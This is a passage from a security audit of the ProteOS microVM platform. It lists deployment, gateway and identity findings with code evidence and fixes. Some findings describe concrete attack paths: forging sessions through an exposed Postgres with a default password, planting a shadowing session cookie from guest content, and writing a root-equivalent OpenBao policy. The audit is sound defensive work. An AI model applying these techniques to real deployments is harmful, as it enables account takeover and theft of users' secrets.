implementation and for places worth improving.

## 1. Scope and method

**What was reviewed:**

- `controlplane/`, `nodeagent/`, `guestagent/`, `cli/` and `web/`
- `image/`, `deploy/` (compose, Kubernetes, Ansible, Proxmox, Prometheus) and `.github/`
- top-level docs, `docs/` and `plans/`

**How:**

1. Seven area reviews ran in parallel: identity/API, orchestration/persistence,
   gateway/secrets, node-agent, guest-agent, web/CLI, and deploy/CI/ops. Each one
   traced code paths and cited `path:line` evidence.
2. The high-impact claims from each area were then re-checked by hand against
   the source before going into this report.
3. Static tooling was run as well (Appendix A).

**What was not done:**

- No runtime testing on a KVM host or a Kubernetes cluster, and no penetration
  testing.
- Findings that depend on browser, kernel or CNI behaviour are marked
  **Likely**.
- Exploitability always depends on the deployment: a single-user homelab and a
  shared multi-tenant instance carry very different risk. Severities assume the
  multi-user deployment the README and SECURITY.md describe.

**Severity scale:**

| Severity | Meaning |
| --- | --- |
| **Critical** | Default or documented configuration exposes all tenants' data or credentials to a realistic attacker. |
| **High** | Breaks a stated security property, crosses a tenant boundary, loses user data, or breaks a core workflow under normal operation. |
| **Medium** | Real defect or design gap with bounded impact or needing a specific trigger; important defence in depth. |
| **Low** | Hardening, hygiene, or polish. |

**Confidence:** **Confirmed** means the code path was traced end to end.
**Likely** means the evidence is strong but one link depends on runtime,
deployment, or third-party behaviour.

## 2. Executive summary

ProteOS is in better shape than most projects at this stage. The core
primitives are sound and unusually well documented:

- a single state-transition function guarded by compare-and-swap;
- consistent ownership checks that return a uniform 404;
- opaque 256-bit credentials stored only as hashes;
- PKCE plus signed OIDC state;
- a TLS-pinned control-plane → node-agent channel;
- LUKS keys that never touch host disk or argv;
- no XSS sinks in the SPA;
- a CI that actually boots the guest image and a kind cluster.

Dependency scans are clean (Appendix A).

The gaps sit mostly at the seams rather than in the core:

- the defaults operators inherit;
- what crosses the microVM boundary (credentials out, IPv6 in);
- how the browser treats content served from machines;
- how the control loop recovers from partial failure.

Several headline claims in SECURITY.md and the README are currently
stronger than the implementation. The themes below group the findings.

1. **Deployment defaults are the weakest link.** The production compose
   stack publishes Postgres and OpenBao on every interface, and Postgres ships
   a default password (OPS-1). The OpenBao backup bundle contains its own
   unseal key and root token, and it is rsynced unencrypted to the backup host
   (OPS-2). The plaintext "DEV-ONLY" file store is the shipped secrets backend
   (OPS-3). Each fix is a few lines of configuration.
2. **The browser doesn't separate the app from content served by
   machines.** Preview and editor origins are same-site with the app, guest
   `Set-Cookie` headers pass straight through, and the session cookie has no
   `__Host-` prefix. Code running in a machine can therefore plant a session
   cookie on the main app and capture the user's API keys (GW-1).
3. **The guest gets more than an untrusted agent should have.** The agent can
   fetch the user's broad GitHub token and push without review (GW-2). It can
   also write results for other users' tasks (GW-5), flood shared services
   (GW-6), and reach the host over IPv6 on its tap (NODE-1). On Cilium,
   `allow_domains` can be pointed at the cloud-metadata IP (NODE-2).
4. **ProteOS has no access gate or credential lifecycle of its own.** Any
   identity that the Zitadel issuer vouches for gets an account (AUTH-1).
   Sessions slide forever, PATs default to never expiring, `users.status` is
   never read, and revocation doesn't reach open connections (AUTH-3, AUTH-4).
   Every user can read the whole control plane's logs (AUTH-2).
5. **The control loop turns brief faults into lasting errors.**
   - One unreachable host flips every running machine in the fleet to `error`
     (ORCH-1).
   - `error` is never reconciled (ORCH-2), and the poller can race a fresh
     boot (ORCH-3).
   - Tasks can stay `running` forever (ORCH-4).
   - Capacity is never checked on the default single-host path (ORCH-5).
   - On the node, operations on one machine are not serialised, so a
     restart during a hibernate can corrupt its disk (NODE-4).
6. **The agent-facing CLI breaks in documented paths.** Flags placed after an
   ID are silently ignored or folded into the prompt (CLI-1). `--json` watch
   exits 0 on a failed task (CLI-2). `project ensure` reports success
   mid-clone (CLI-3).
7. **Operators can't see problems.** The shipped Prometheus scrape config
   can't reach its targets, and three of the alert rules can never fire (OBS-1).
   Nothing ties a request together across the control plane, node-agent and
   guest (OBS-2).

**Totals:** 2 Critical, 34 High, 56 Medium, 24 Low.

## 4. Findings

### 4.1 Deployment, secrets operations and DR (OPS)

#### OPS-1 — Postgres and OpenBao are published on every interface, and Postgres ships a default password
`Critical` · security · Confirmed

- **Evidence:**
  - `deploy/app-stack/compose.yaml:40-41` publishes `- 5432:5432`.
  - `compose.yaml:26` sets `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-proteos}`, and
    `deploy/app-stack/.env.example:12` sets `POSTGRES_PASSWORD=proteos`.
  - OpenBao listens on `0.0.0.0:8200` with `"tls_disable": true` (`:55`) and is
    published at `:74-75`.
  - `web` is published on `${WEB_PORT:-8080}:80` (`:259-260`), which bypasses
    the TLS proxy.
  - There are no per-service networks.
- **Impact:** Anything that can route to the app VM can log into Postgres with
  a known password. Sessions are looked up by the SHA-256 of a token, so an
  attacker can insert a session row for a token they choose and become any
  user, admins included. The RUNBOOK's ufw advice (`RUNBOOK.md:107`) doesn't
  help, because Docker-published ports are DNAT'd ahead of ufw's rules.
- **Fix:**
  - Remove the Postgres `ports:` entry; `backup-postgres.sh` already uses
    `docker compose exec`.
  - Bind OpenBao and web to `127.0.0.1` or the proxy interface.
  - Make the password required (`${POSTGRES_PASSWORD:?}`).
  - Split `frontend`/`backend` networks so `web` cannot reach Postgres or
    OpenBao. The Kubernetes app stack already does this with NetworkPolicy.
  - `compose.smoke.yaml:53` already uses the `127.0.0.1:` form.

#### OPS-2 — Backups are unencrypted, and the OpenBao bundle carries its own unseal key and root token
`Critical` · security/DR · Confirmed

- **Evidence:**
  - `deploy/app-stack/backup-openbao.sh:82-85` tars `baodata`.
  - `:89-95` copies `openbao-init.json` (unseal key and root token),
    `bao-unseal-key` and `openbao-secret-id` into the same bundle.
  - `:108-111` runs `rsync -a --delete` to the remote.
  - `backup-postgres.sh:51-52,67` writes and ships a plaintext `pg_dump`.
  - `docs/disaster-recovery.md:243-248` documents the bundling as intentional.
- **Impact:** Read access to the backup target is enough to unseal OpenBao
  offline. That target is typically a NAS or a second box, protected less than
  production. Unsealing yields every LUKS volume key, provider API key and
  GitHub/Gitea token. `backup-volumes.sh` also pushes the `.luks` files, so
  every user disk is exposed as well. `--delete` mirrors a wiped or ransomed
  local directory to the remote.
- **Fix:**
  - Encrypt every artifact before it leaves the host, e.g. with `age` or `gpg`
    to an offline recipient key that does not live on the app VM.
  - Escrow the unseal key and root token separately (offline, or in a password
    manager).
  - Replace `--delete` with versioned or immutable remote storage.

#### OPS-3 — The secrets seal is cosmetic, and the plaintext file store is the shipped default
`High` · security · Confirmed

- **Evidence:**
  - **File store is the default.** `PROTEOS_SECRETS_BACKEND` defaults to `file`
    in `controlplane/internal/config/config.go:260`, `compose.yaml:130`,
    `.env.example:34` and `deploy/kubernetes/app-stack/base/controlplane.env:14`.
    That backend is the plaintext JSON store that
    `controlplane/internal/secrets/filestore.go:13-14` labels "DEV-ONLY".
  - **1-of-1 unseal key on the same disk.** With OpenBao,
    `openbao-init.sh:56` uses `-key-shares=1 -key-threshold=1`, and `:61-67`
    writes the only key next to `compose.yaml`, on the same disk as the data.
  - **Key on argv.** `bao-unsealer.sh:33` passes it on argv
    (`bao operator unseal "$(cat …)"`).
  - **Root token kept.** It stays in `openbao-init.json` and is never revoked.
  - **AppRole secret_ids never expire.** `secret_id_ttl=0` and
    `secret_id_num_uses=0` (`:136-137`). Each re-run mints another one (`:141`)
    and never revokes the old ones.
- **Impact:**
  - The README and architecture doc say provider keys are "stored encrypted
    in OpenBao". A deployment that follows `.env.example` stores them in
    plaintext.
  - Even with OpenBao, anyone holding the app VM's disk (or a Proxmox
    snapshot/vzdump of it) has every secret.
  - Phase 12 of `plans/proteos-poc-to-prod.md` calls for a real auto-unseal
    strategy.
- **Fix:**
  - Fail startup when the backend is `file` and `PROTEOS_BASE_URL` is not
    localhost.
  - Use a real seal: transit against a separate instance, cloud KMS, or
    PKCS#11/TPM (`systemd-creds`).
  - Revoke the root token after init, and use `operator generate-root` when
    one is needed.
  - Unseal through the HTTP API, reading the key from a file rather than argv.
  - Revoke stale secret_ids, and set `secret_id_bound_cidrs` and
    `token_bound_cidrs`.
  - See also GW-3 for the policy-authoring issue.

#### OPS-4 — Exported agent sessions are lost on every compose redeploy
`High` · data loss · Confirmed

- **Evidence:**
  - `config.go:296` defaults `PROTEOS_SESSION_EXPORT_DIR` to
    `./exports/sessions/`, a path relative to the distroless working directory.
  - `compose.yaml` never sets it, and the only volume is
    `cpdata:/var/lib/proteos` (`:228`).
  - The Kubernetes stack sets it correctly (`controlplane.env:24`).
- **Impact:** Destroy is blocked until the session export succeeds
  (`controlplane/internal/machine/service.go:530-545`), precisely to preserve
  transcripts. In compose, though, the exports land in the container's
  writable layer and vanish at the next `docker compose up -d`, which happens
  on every deploy and every rollback. They are also outside every backup.
- **Fix:**
  - Set `PROTEOS_SESSION_EXPORT_DIR=/var/lib/proteos/exports/sessions` in
    compose.
  - Include it in the backup set.
  - Refuse to start when the directory is not on a mounted volume.

#### OPS-5 — DR can't recover machines created since the last OpenBao backup, and hot volume backups are not crash-consistent
`High` · DR · Confirmed

- **Evidence:**
  - Volume keys exist only in OpenBao, which is backed up daily
    (`proteos-backup.timer:8`).
  - `docs/disaster-recovery.md:143-181` (scenario 1, app VM lost, KVM hosts
    intact) doesn't mention one consequence. A machine created after the last
    backup keeps an intact `.luks` file on its host but has no key and no DB
    row, so it cannot be recovered.
  - `deploy/node-agent/backup-volumes.sh:95,114` rsyncs live containers with no
    snapshot and without `--sparse`.
  - `:17-21` and `disaster-recovery.md:133-139` call these copies
    "crash-consistent".
- **Impact:** The real recovery point for disks is the last OpenBao backup,
  not "the KVM host survived". A sequential rsync of a container that is being
  written is not a point-in-time image, so ext4 journal replay may not be able
  to repair it. Sparse containers also expand to full size on the remote.
- **Fix:**
  - Back up the KV tree, which is small, whenever a key is created, or at least
    hourly.
  - State the recovery point for each scenario honestly.
  - Take an LVM/ZFS/btrfs/reflink snapshot before copying, or back up only
    closed volumes, and pass `--sparse`.

#### OPS-6 — Backup jobs can fail silently, and nothing tests them
`Medium` · DR/ops · Confirmed

- **Evidence:**
  - **No failure signal.** `proteos-backup.service:20-24` and
    `proteos-backup-volumes.service:19-24` have no `OnFailure=`, and no metric
    reports when a backup last ran.
  - **Wrong env file.** `backup-volumes.sh:34` sources `deploy/node-agent/.env`
    rather than `/etc/proteos/node-agent.env`. With a non-default volumes
    directory it reaches "nothing to do" (`:61-64`) and exits 0.
  - **Coverage gaps.** The app `.env` (role_id, agent token, OAuth client
    secret) is in no backup set. The Kubernetes app stack has no backup job.
  - **No restore tests.** No script is exercised in CI, and
    `disaster-recovery.md:226-235` relies on manual quarterly drills.
- **Fix:**
  - Add `OnFailure=` notification, a textfile-exporter timestamp, and an alert
    on its age.
  - Source the real env file, and fail on a directory mismatch.
  - Add Kubernetes CronJobs.
  - Add a CI job that brings up compose, initialises OpenBao, backs up,
    restores into a fresh stack and reads a key back.

#### OPS-7 — Firecracker, jailer and kernel downloads are unverified, and version bumps never reach existing hosts
`High` · security/ops · Confirmed

- **Evidence:**
  - `deploy/ansible/roles/firecracker/tasks/main.yml:11-18` installs only
    `when: not fc_bin.stat.exists`, with no `checksum:`.
  - `:41-44` registers `firecracker --version` but never asserts it.
  - `:50-54` fetches the kernel with `get_url`, without checksum or `force`, so
    changing `proteos_kernel_key` does nothing. `:71-75` does the same for the
    squashfs.
  - The Go and Taskfile tarballs are unchecked too.
  - `deploy/ansible/README.md:138-140` claims the opposite: that bumping a pin
    and re-running "upgrades the host in place".
- **Impact:** The VMM and jailer are the tenant boundary. A Firecracker
  security release silently never lands, the fleet drifts to mixed versions,
  and a tampered download is never detected.
- **Fix:**
  - Pin SHA-256 values in `group_vars`, taken from the release `SHA256SUMS`,
    and pass `checksum:` to every download.
  - Guard installs on the version string, and assert it after install.
  - Key the kernel path (or a stamp file) on the kernel key.

#### OPS-8 — KVM hosts expose management services on the uplink, and Ansible leaks secrets
`Medium` · security · Confirmed

- **Evidence:**
  - **Management services on the default route.** `group_vars/all.yml:285`
    sets `proteos_agent_mgmt_ifaces: "egress,tailscale0"`, which is also the
    code default (`nodeagent/internal/config/config.go:345`). SSH, the agent
    API and the unauthenticated `/metrics` are therefore reachable on the
    default-route interface.
  - **Agent port not locked down.** `proteos_restrict_agent_port: false`
    (`:317`).
  - **Secrets pushed without host-key checks.** `ansible.cfg:4` sets
    `host_key_checking = False` while the play pushes the agent token and the
    Tailscale key.
  - **Auth key on argv.** `roles/tailscale/tasks/main.yml:63-70` puts
    `--authkey` on argv without `no_log`.
  - **No OS hardening.** There is no unattended-upgrades and no sshd baseline.
- **Fix:**
  - Default the management interfaces to `tailscale0`, and default the port
    restriction to on.
  - Use `known_hosts` with host-key checking enabled.
  - Add `no_log: true`, and pass the key via `TS_AUTHKEY`.
  - Add baseline host hardening.

#### OPS-9 — The node-agent is deployed from the operator's working tree, and the rsync denylist can copy control-plane secrets to KVM hosts
`Medium` · ops/security · Confirmed (secret copy Likely)

- **Evidence:**
  - `group_vars/all.yml:307-309` sets `proteos_src_local` to the checkout
    root.
  - `roles/node_agent/tasks/main.yml:23-40` rsyncs that tree, uncommitted
    changes included. It excludes only `.git`, `node_modules`, `*.ext4`,
    `*.luks`, `.env` and `*.env`.
  - Not excluded are the gitignored secrets that live in the same checkout:
    `openbao-init.json`, `bao-unseal-key`, `openbao-secret-id` and
    `deploy/kubernetes/site/`.
  - Image names come from `git rev-parse --short HEAD`, which ignores a dirty
    tree.
- **Impact:** The tier closest to untrusted workloads can end up holding the
  OpenBao root token. Nobody can tell which build is deployed (see X-1).
- **Fix:**
  - Deploy from a tag or a CI-built artifact.
  - Turn the rsync into an allowlist (`nodeagent/`, `deploy/node-agent/`,
    `image/`).
  - Stamp versions into the binaries.

#### OPS-10 — The app origin sends no security headers, trusts the client's `X-Forwarded-Proto`, and defaults to non-Secure cookies
`Medium` · security · Confirmed

- **Evidence:**
  - The SPA/API server block in `deploy/app-stack/nginx.conf:41-98` has no CSP,
    `frame-ancestors`/X-Frame-Options, `nosniff`, Referrer-Policy or HSTS.
  - `:18-21` forwards the client-supplied `X-Forwarded-Proto` verbatim.
  - `compose.yaml:125` and `.env.example:23` default `PROTEOS_COOKIE_SECURE` to
    `false`, while the code default is `true` (`config.go:269`). Nothing
    cross-checks the setting against an `https` base URL.
  - There is no `client_max_body_size`, so preview apps get a 413 above 1 MB.
  - `server_tokens` is on.
- **Impact:** The dashboard can be framed, which enables clickjacking of
  "Destroy all" and "Approve & merge". GW-1's same-site preview origins make
  that easier. A production deploy that forgets one variable ships non-Secure
  session cookies.
- **Fix:**
  - Send `Content-Security-Policy: default-src 'self'; frame-ancestors 'none'`
    (or `'self'`), plus `nosniff`, `Referrer-Policy`, and HSTS if the proxy
    doesn't.
  - Trust `X-Forwarded-Proto` only from the proxy.
  - Derive `Secure` from an `https` base URL, or refuse to start.
  - Set explicit body limits for each server block.

#### OPS-11 — Containers and pods are not hardened, and logs grow without rotation
`Medium` · security/ops · Confirmed

- **Evidence:**
  - **Compose:**
    - `controlplane.Dockerfile:34-36` runs as root.
    - No `read_only`, `cap_drop`, `no-new-privileges`, CPU/memory limits,
      log rotation, or healthchecks for `controlplane`/`web`.
    - The OpenBao audit log on `baologs` is never rotated. When no audit device
      can write, OpenBao refuses requests, so a full disk becomes an outage.
  - **Kubernetes:**
    - `proteos-system` has no Pod Security labels
      (`deploy/kubernetes/app-stack/base/namespace.yaml:10-19`).
    - The control-plane pod runs as root without seccomp or a read-only root
      filesystem (`controlplane.yaml:63-65,155-158`).
    - `baologs` is an `emptyDir` (`openbao.yaml:115-117`), so the audit trail
      is lost on every restart.
- **Fix:**
  - Switch to `:nonroot` with a `chown`ed volume.
  - Add compose hardening keys, limits, and
    `logging: {driver: json-file, options: {max-size, max-file}}`.
  - Use logrotate or the socket audit device for OpenBao.
  - Apply PSA `restricted` or `baseline` to `proteos-system`.
  - Put audit logs on a PVC.

#### OPS-12 — Base images are stale and unpinned, and Dependabot doesn't watch Docker
`Medium` · supply chain · Confirmed (EOL dates Likely)

- **Evidence:**
  - `web.Dockerfile:21` uses `nginx:1.27-alpine`, a superseded mainline
    branch, on the internet-facing tier.
  - `web.Dockerfile:14` and `ci.yml:272,423` use Node 25, an odd-numbered major
    with a short support window.
  - `postgres:16` floats.
  - Nothing is pinned by digest.
  - `.github/dependabot.yml` has no `docker` ecosystem.
- **Fix:**
  - Move to nginx 1.28 (or an unprivileged image) and Node 24 LTS.
  - Pin images by `@sha256`.
  - Add Dependabot docker entries for `deploy/app-stack`, `deploy/node-agent`
    and `image`.

#### OPS-13 — The Kubernetes app stack deploys `latest`, and the docs reference guest tags that CI never publishes
`Medium` · ops/docs · Confirmed

- **Evidence:**
  - `deploy/kubernetes/app-stack/base/kustomization.yaml:60-64` sets
    `newTag: latest`.
  - The k3s overlay pin is commented out (`overlays/k3s/kustomization.yaml:31-36`).
  - `install-k3s.sh:37-38` defaults to `latest`.
  - All of this contradicts `DEPLOYMENT.md:58-62` and the compose `:?` guard.
  - The docs use `proteos-guest:base-1.2.3` (`.env.example:80`,
    `deploy/kubernetes/README.md:174,278,288`), but `ci.yml:504-509` publishes
    only `latest`, `sha-*`, `1.2.3` and `1.2`.
- **Fix:**
  - Make the overlay and installer refuse `latest`.
  - Either publish `base-<ver>` tags or correct the docs.

#### OPS-14 — The rolling-deploy procedure kills in-flight requests
`Low` · ops · Confirmed

- **Evidence:**
  - `DEPLOYMENT.md:140-141` uses `docker rm -f "$OLD"`. That SIGKILLs the old
    replica and skips the graceful drain (`PROTEOS_SHUTDOWN_TIMEOUT`).
  - NEW and OLD are chosen by the head and tail of `docker compose ps -q`,
    whose order isn't guaranteed.
  - No expand/contract migration rule is written down (`:189-197`).
  - The control plane is also not safe to run as two replicas (X-2).
- **Fix:**
  - Select replicas by name or creation time.
  - Use `docker stop -t 35`.
  - Document an expand/contract migration policy, or switch to stop-then-start.

### 4.2 Gateway, browser boundary and secrets handling (GW)

#### GW-1 — Machine-served content is same-site with the app and can plant cookies on the main origin
`High` · security · Confirmed (code path); browser cookie semantics are standard

- **Evidence:**
  - **Same-site layout.** `RUNBOOK.md:657-664,679` recommends
    `machines.proteos.example`, under the app's registrable domain, and
    `config.go:291` reads `PROTEOS_MACHINE_DOMAIN` without validating it.
  - **Guest cookies pass through.**
    `controlplane/internal/gateway/machineweb.go:147-159` (`ModifyResponse`)
    only strips X-Frame-Options and sets CSP. A guest's
    `Set-Cookie: …; Domain=proteos.example` reaches the browser untouched.
  - **The session cookie can be shadowed.** It is `proteos_session` with no
    `__Host-` prefix (`auth/auth.go:39,477-487`).
    `httpapi/middleware.go:95` takes the first cookie of that name, and
    browsers send cookies with longer paths first. Logout clears only the
    host-only cookie, so a planted one survives.
  - **Auth links work for anyone.** `/__proteos/auth?token=` isn't bound to
    the visitor. `handleAuth` (`machineweb.go:232-243`) sets a cookie bound to
    the token's session, so anyone following user B's link sees B's preview on
    a trusted subdomain.
  - **No framing defences.** The preview iframe has no `sandbox`
    (`web/src/windows/PreviewWindow.tsx:85`), and the SPA sends no
    `frame-ancestors` (OPS-10).
- **Impact:**
  - Code running in a machine can set
    `proteos_session=<attacker token>; Domain=<parent>; Path=/api/secrets`. That
    code could be a prompt-injected agent's dev server, or another user's
    preview reached through a shared link.
  - The victim's next "save API key" request then authenticates as the
    attacker. The key is stored in the attacker's account and injected into the
    attacker's machine. The same works for the Claude subscription token
    (`/api/profile/items/…`) and Gitea PATs.
  - It also enables phishing on a subdomain with valid TLS, same-site
    clickjacking (Lax cookies flow into same-site frames), and CSRF on the
    GitHub-connect flow by planting the OAuth state cookie.
  - The port-preview plan deferred a separate domain because previews were
    "owner-authenticated only" (`plans/port-preview-implementation.md:12-17,222-225`).
    That premise doesn't hold.
- **Fix** (layered):
  1. Serve machine content from a separate registrable domain, and refuse to
     start if it shares an eTLD+1 with `PROTEOS_BASE_URL`.
  2. Rename the session and OAuth-flow cookies with the `__Host-` prefix, and
     reject requests that carry more than one session cookie.
  3. Strip `Set-Cookie` headers with a `Domain` attribute (or all of them) from
     proxied responses.
  4. Make the auth token single-use and bind it to the browser that minted it.
  5. Sandbox the preview iframe (without `allow-top-navigation`) and send
     `frame-ancestors` on the SPA.

#### GW-2 — The untrusted agent can get the user's broad GitHub token, so the "review gate" is advisory
`High` · security/design · Confirmed

- **Evidence:**
  - **The agent can open the credential socket.**
    `guestagent/internal/localsock/localsock.go:59-87` `chown`s the socket to
    the session user (`dev`), the same uid the agent runs as.
  - **Requests aren't tied to a repo.** A request carries only host and
    protocol (`guestagent/api/guestwire.go:606-609`).
  - **The control plane hands over broad credentials.** For any https request
    to the git host, it returns the roughly 8-hour user-to-server token
    (`controlplane/internal/guestctl/manager.go:357-370`). For Gitea/Forgejo
    it returns the stored, non-expiring PAT verbatim (`:371-384`).
  - **The token is handed to agents by design.** `docs/github-app.md` §3 has
    the `gh` wrapper export it as `GH_TOKEN`.
  - **No disconnect.** There is no "disconnect GitHub" or grant-revocation
    flow.
- **Impact:** The README says the agent "never commits on its own" and calls
  the explicit commit "the review gate before anything reaches origin". In
  practice the agent, or a prompt-injected repo, can `git push` or call the
  GitHub API with the user's App permissions. That covers every repo in every
  installation the user granted, not just the one on the machine. It includes
  workflow files, and through them CI secrets.
- **Fix:** Decide whether the gate is a guarantee or a convention.
  - **If it's a guarantee:**
    - Make credentials available only to the guest-agent's own push and PR
      operations, for example as a one-time credential handed to that git
      process. Don't expose them on a socket the agent's uid can open.
    - Mint installation tokens scoped to `repositories=[<repo>]` with minimal
      permissions and a one-hour lifetime, only for repos cloned on that
      machine.
    - Rate-limit credential requests, and add disconnect/revoke.
  - **If it's a convention:** say so plainly in the README and SECURITY.md.

#### GW-3 — OpenBao per-user scoping doesn't stop confused-deputy bugs, and the control-plane role can write any policy
`Medium` · security/design · Confirmed

- **Evidence:**
  - `controlplane/internal/secrets/bao.go:20-27` claims that a confused-deputy
    bug "fails in Bao".
  - But the user id used to mint the scoped token is parsed from the requested
    path itself (`bao.go:126-134`, `splitPath` at `:320-334`).
  - The `Store` interface has no acting-user parameter (`secrets.go:26-33`).
  - **Runtime policy authoring.**
    - `deploy/app-stack/openbao-init.sh:109-111` grants `cp-base`
      create/update on `sys/policies/acl/user-*`.
    - `:122-127` lets the token role issue tokens for `user-*` policies.
    - A compromised control plane can therefore write `user-x` with
      `path "*" { … "sudo" }` and mint itself a root-equivalent token. That
      reaches beyond ProteOS's prefix if OpenBao is shared.
- **Impact:** The HTTP-layer ownership checks are the only boundary between
  users' secrets. Those checks are consistent (see §6), but the advertised
  defence in depth doesn't exist.
- **Fix:**
  - Pass the acting user explicitly, and reject a mismatched path before
    minting a token.
  - Pre-provision identity-templated policies instead of authoring them at
    runtime.
  - Add a cross-user test for `BaoStore`, and correct the comment.

#### GW-4 — Rotating or deleting a provider key never reaches running machines
`Medium` · security/correctness · Confirmed

- **Evidence:**
  - `controlplane/internal/httpapi/providers.go:88-129` (set) and `:146-170`
    (delete) never call `reinjectRunningMachines`.
  - Every other credential change does: profile items (`profile.go:143,169`),
    git SSH (`profile_git_ssh.go:182,204`), login keys (`sshkeys.go:94,125`),
    and the SSH switch (`userprefs.go:108`).
- **Impact:** A deleted key stays in the guest's tmpfs env file, and inside
  hibernation snapshots, until the next start or task launch. This contradicts
  `injector/injector.go:67-69`.
- **Fix:** Re-inject after both set and delete, and add a handler test.

#### GW-5 — Guest-reported task results are accepted for any task id
`Medium` · security · Confirmed

- **Evidence:**
  - `guestctl/manager.go:325-330` dispatches `agent.done` and `agent.event`
    without the machine bound to the connection.
  - `:519-536` calls `FinishAgentTask` with the guest-supplied `TaskID`, and the
    SQL filters only on `WHERE id = sqlc.arg(id)`
    (`controlplane/internal/store/queries.sql:454-465`).
  - `:486-488` publishes frames to whichever task id the guest names.
- **Impact:** A malicious guest that learns another user's task UUID can
  rewrite that task's status, summary and `agent_session_id`, and inject frames
  into its live stream. Task ids are random UUIDs, which limits
  exploitability. It still breaks the stated invariant that the machine id
  from the dial is the authorization context (`guestctl/conn.go:6-8`).
- **Fix:**
  - Add `AND machine_id = $bound` to the update.
  - Check ownership before publishing.
  - Add a test with a foreign task id.

#### GW-6 — Guest-to-control-plane RPCs are unbounded
`Medium` · availability · Confirmed

- **Evidence:**
  - `guestctl/conn.go:60-62` runs `go c.dispatch(ctx, f)` for every frame, with
    no cap on in-flight requests and no rate limit.
  - Frames can be up to 1 MiB (`guestctl/guestdial.go:38`).
  - Each `git.credential` costs a Postgres read, an OpenBao token create plus
    read, and an audit insert.
- **Impact:** One compromised guest can degrade Postgres, OpenBao and the
  control plane for every tenant.
- **Fix:**
  - Add a per-connection semaphore and per-operation token buckets.
  - Cache credentials until close to expiry.
  - Close the channel on abuse.

#### GW-7 — The editor/preview token is reusable, interchangeable with its cookie, and the cookie is forwarded to the guest
`Low` · security · Confirmed

- **Evidence:**
  - `gateway/machineweb_token.go:46-70` signs the token and the cookie with the
    same format and key, and their JSON tags (`m/s/e/p`) overlap.
  - So a 12-hour cookie value is accepted as `?token=` and mints a fresh
    12-hour cookie.
  - The "one-shot" token (`:2-9`) has no nonce.
  - The key is `StateSigningKey`, which also signs OAuth state
    (`cmd/controlplane/main.go:395`).
  - The proxy never strips `Cookie`, so code-server and the user's app receive
    `proteos_machine`.
  - Mitigation: the embedded session id is a row UUID re-validated against the
    DB, not a bearer secret.
- **Impact:** A compromised guest can leak a portable link that opens the
  machine's editor from any browser for as long as the owner's session lives.
  That is an inbound path the egress policy can't block.
- **Fix:**
  - Strip `proteos_machine` from the forwarded `Cookie` header.
  - Add a `typ` claim, or derive a separate key for each purpose with HKDF.
  - Make tokens single-use with a jti.

#### GW-8 — Reverse-proxy hygiene
`Low` · security · Confirmed

- **Evidence and fixes:**
  - **CSP is replaced.** `machineweb.go:155-157` uses `Header.Set`, which
    replaces the app's own CSP. Use `Add` instead, since multiple policies
    intersect.
  - **Deprecated Director.** The proxy uses `ReverseProxy.Director`
    (staticcheck SA1019). `Rewrite` removes hop-by-hop headers before your
    rewrite and handles `X-Forwarded-*` correctly.
  - **Idle tunnels linger.** The transport has no `IdleConnTimeout`
    (`:112-131`).
  - **code-server proxy left on.** code-server starts without `--disable-proxy`
    (`guestagent/internal/webfwd/webfwd.go:102-115`). Its `/proxy/<port>/` then
    exposes any guest port on the editor origin, bypassing both the per-port
    origin split and the `PROTEOS_PREVIEW_PORT_MIN/MAX` range (Likely; this
    relies on code-server's default).

#### GW-9 — An OpenBao outage looks like "no key set" and pins goroutines
`Low` · ops · Confirmed

- **Evidence:**
  - Every OpenBao call uses `context.Background()`
    (`bao.go:110,135,149,182,254,275`), with a 60s client timeout plus retries.
  - `providerKeySet` returns false on any error (`providers.go:70-76`). During
    an outage the UI shows keys as unset, and `/gw/agent` answers
    `409 no_provider_key` instead of 503.
- **Fix:**
  - Thread `ctx` through `Store` and use short timeouts.
  - Separate not-found from unavailable.
  - Cache the per-user child token.

#### GW-10 — Secret pushes are unordered, so a stale push can restore a revoked key
`Low` · security · Likely (timing window)

- **Evidence:**
  - `injector/injector.go:81-101` spawns an independent goroutine per trigger,
    with no per-machine ordering.
  - Pushes replace the whole secret set, so an older snapshot landing after a
    newer one can bring back a revoked `authorized_keys` line.
  - After 5 attempts the injector only logs.
- **Fix:**
  - Run pushes as a per-machine single-flight with a generation counter.
  - Show a "secrets stale" status on the machine.

#### GW-11 — Gateway connection limits, keepalives and SSH key policy
`Low` · ops/security · Confirmed

- **Evidence:**
  - There is no per-user or global cap on `/gw/*` or machine-web upgrades
    (`httpapi/server.go:381-395`), and each upgrade holds a node-agent tunnel.
  - The SSH relay has no ping loop (`gateway/ssh.go:90`; compare
    `terminal.go:132`), so idle sessions die at nginx's 1-hour
    `proxy_read_timeout`.
  - `sshkeys/store.go:195-204` accepts ssh-dss, RSA under 2048 bits, and
    certificate types, with no cap on keys per user.
- **Fix:**
  - Add per-user connection caps.
  - Add an SSH ping loop.
  - Allowlist ed25519, ecdsa, `sk-*` and RSA ≥ 3072, and cap keys per user.

### 4.3 Identity, sessions and the HTTP API (AUTH)

#### AUTH-1 — ProteOS has no authorization gate of its own
`High` · security · Confirmed (impact depends on who holds identities on the issuer)

- **Evidence:**
  - **No access check in code.** `resolveOIDCUser`
    (`controlplane/internal/auth/auth.go:243-320`) reads only the admin role,
    then links or creates a user for any subject the issuer vouches for.
  - **Any token from the issuer works.** The bearer path (`bearer.go:64-96`)
    accepts any access token that userinfo accepts, "whichever application
    obtained it" (comment at `:53-59`). It auto-provisions a user on the first
    API call.
  - **Zitadel doesn't gate it either.**
    `scripts/zitadel/register-proteos-admin-role.sh:27-30` deliberately leaves
    `projectRoleCheck`/`hasProjectCheck` off.
  - **The allowlist covers only GitHub connect.** `ALLOWED_GITHUB_LOGINS` gates
    only Connect GitHub (`auth.go:383-390`).
- **Impact:**
  - On a shared Zitadel instance, any human identity gets an account with up
    to 5 microVMs. That includes other orgs and self-registered users of
    sibling apps.
  - So does any access token minted for any client on the issuer, including
    Zitadel's built-in Console.
  - Verified-email auto-linking (`:282-304`) also runs on the bearer path. A
    Zitadel org admin who creates a user with a victim's verified email takes
    over the victim's pre-Zitadel account: machines, GitHub link and secrets.
  - Risk is lower on a dedicated single-org instance with self-registration
    off.
- **Fix:**
  - Require a ProteOS role (e.g. `proteos.user`) in both the browser and
    bearer paths.
  - For bearers, check the audience via introspection, or accept only subjects
    that have already signed in through the browser. Never auto-provision from
    a bearer.
  - Put email linking behind an operator opt-in.

#### AUTH-2 — Every user can read the whole control plane's logs and forge entries in them
`High` · security (cross-tenant) · Confirmed

- **Evidence:**
  - **Readable by any user.** `httpapi/server.go:372-376` wraps `GET /api/logs`,
